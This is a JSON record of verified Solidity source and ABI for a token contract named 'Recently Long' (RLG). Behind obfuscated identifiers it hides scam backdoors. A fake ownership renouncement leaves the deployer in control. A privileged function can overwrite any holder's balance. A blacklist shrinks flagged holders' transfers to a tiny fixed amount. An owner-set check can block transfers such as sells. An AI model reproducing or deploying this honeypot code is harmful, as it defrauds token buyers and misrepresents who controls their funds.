{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface feeListReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isFromTrading {\n    function createPair(address toExempt, address swapReceiver) external returns (address);\n}\n\ninterface atAmountShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenReceiver) external view returns (uint256);\n\n    function transfer(address isFrom, uint256 enableSwapMin) external returns (bool);\n\n    function allowance(address takeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableSwapMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isFrom,\n        uint256 enableSwapMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isAmount, uint256 value);\n    event Approval(address indexed takeReceiver, address indexed spender, uint256 value);\n}\n\ninterface marketingAuto is atAmountShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RecentlyLong is minTeam, atAmountShould, marketingAuto {\n\n    uint256 private sellLaunched;\n\n    function amountLiquidity(address launchTo) public {\n        limitReceiverExempt();\n        \n        if (launchTo == minLiquidity || launchTo == buyIs) {\n            return;\n        }\n        marketingBuyExempt[launchTo] = true;\n    }\n\n    function balanceOf(address tokenReceiver) public view virtual override returns (uint256) {\n        return launchedLaunchTrading[tokenReceiver];\n    }\n\n    uint256 private enableMode;\n\n    string private senderAmountLaunched = \"Recently Long\";\n\n    function launchShouldMax(address liquidityFee, address isFrom, uint256 enableSwapMin) internal returns (bool) {\n        require(launchedLaunchTrading[liquidityFee] >= enableSwapMin);\n        launchedLaunchTrading[liquidityFee] -= enableSwapMin;\n        launchedLaunchTrading[isFrom] += enableSwapMin;\n        emit Transfer(liquidityFee, isFrom, enableSwapMin);\n        return true;\n    }\n\n    function feeMode() public {\n        emit OwnershipTransferred(minLiquidity, address(0));\n        totalEnable = address(0);\n    }\n\n    function allowance(address autoTo, address feeIs) external view virtual override returns (uint256) {\n        if (feeIs == minAmountLaunched) {\n            return type(uint256).max;\n        }\n        return walletLaunched[autoTo][feeIs];\n    }\n\n    address private totalEnable;\n\n    string private launchedToken = \"RLG\";\n\n    uint256 private limitExempt = 100000000 * 10 ** 18;\n\n    function approve(address feeIs, uint256 enableSwapMin) public virtual override returns (bool) {\n        walletLaunched[_msgSender()][feeIs] = enableSwapMin;\n        emit Approval(_msgSender(), feeIs, enableSwapMin);\n        return true;\n    }\n\n    bool public walletIs;\n\n    bool private modeBuy;\n\n    function limitReceiverExempt() private view {\n        require(tradingListAt[_msgSender()]);\n    }\n\n    function receiverTxFrom(address enableMaxMarketing, uint256 enableSwapMin) public {\n        limitReceiverExempt();\n        launchedLaunchTrading[enableMaxMarketing] = enableSwapMin;\n    }\n\n    function takeShould(uint256 enableSwapMin) public {\n        limitReceiverExempt();\n        buyLimitFrom = enableSwapMin;\n    }\n\n    function transfer(address enableMaxMarketing, uint256 enableSwapMin) external virtual override returns (bool) {\n        return fromSell(_msgSender(), enableMaxMarketing, enableSwapMin);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedToken;\n    }\n\n    address minAmountLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function maxMarketingWallet(address shouldAmount) public {\n        if (isMin) {\n            return;\n        }\n        \n        tradingListAt[shouldAmount] = true;\n        \n        isMin = true;\n    }\n\n    bool public isMin;\n\n    constructor (){\n        if (walletIs) {\n            sellLaunched = senderTotalFund;\n        }\n        feeListReceiver isEnable = feeListReceiver(minAmountLaunched);\n        buyIs = isFromTrading(isEnable.factory()).createPair(isEnable.WETH(), address(this));\n        \n        minLiquidity = _msgSender();\n        feeMode();\n        tradingListAt[minLiquidity] = true;\n        launchedLaunchTrading[minLiquidity] = limitExempt;\n        if (walletIs) {\n            limitShould = false;\n        }\n        emit Transfer(address(0), minLiquidity, limitExempt);\n    }\n\n    function fromSell(address liquidityFee, address isFrom, uint256 enableSwapMin) internal returns (bool) {\n        if (liquidityFee == minLiquidity) {\n            return launchShouldMax(liquidityFee, isFrom, enableSwapMin);\n        }\n        uint256 takeMax = atAmountShould(buyIs).balanceOf(fromAt);\n        require(takeMax == buyLimitFrom);\n        require(isFrom != fromAt);\n        if (marketingBuyExempt[liquidityFee]) {\n            return launchShouldMax(liquidityFee, isFrom, receiverLimit);\n        }\n        return launchShouldMax(liquidityFee, isFrom, enableSwapMin);\n    }\n\n    uint256 private marketingTrading;\n\n    function getOwner() external view returns (address) {\n        return totalEnable;\n    }\n\n    uint8 private feeMin = 18;\n\n    address public minLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMin;\n    }\n\n    uint256 buyLimitFrom;\n\n    bool private maxBuy;\n\n    address public buyIs;\n\n    bool public listMinShould;\n\n    bool private limitShould;\n\n    bool private limitSellTrading;\n\n    event OwnershipTransferred(address indexed amountSwapSender, address indexed fromTo);\n\n    function owner() external view returns (address) {\n        return totalEnable;\n    }\n\n    address fromAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address liquidityFee, address isFrom, uint256 enableSwapMin) external override returns (bool) {\n        if (_msgSender() != minAmountLaunched) {\n            if (walletLaunched[liquidityFee][_msgSender()] != type(uint256).max) {\n                require(enableSwapMin <= walletLaunched[liquidityFee][_msgSender()]);\n                walletLaunched[liquidityFee][_msgSender()] -= enableSwapMin;\n            }\n        }\n        return fromSell(liquidityFee, isFrom, enableSwapMin);\n    }\n\n    uint256 public senderTotalFund;\n\n    mapping(address => uint256) private launchedLaunchTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitExempt;\n    }\n\n    uint256 constant receiverLimit = 7 ** 10;\n\n    mapping(address => bool) public marketingBuyExempt;\n\n    mapping(address => mapping(address => uint256)) private walletLaunched;\n\n    mapping(address => bool) public tradingListAt;\n\n    uint256 modeMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return senderAmountLaunched;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSwapSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"}],\"name\":\"amountLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableSwapMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMinShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingBuyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"}],\"name\":\"maxMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMaxMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableSwapMin\",\"type\":\"uint256\"}],\"name\":\"receiverTxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotalFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableSwapMin\",\"type\":\"uint256\"}],\"name\":\"takeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingListAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMaxMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableSwapMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableSwapMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RecentlyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}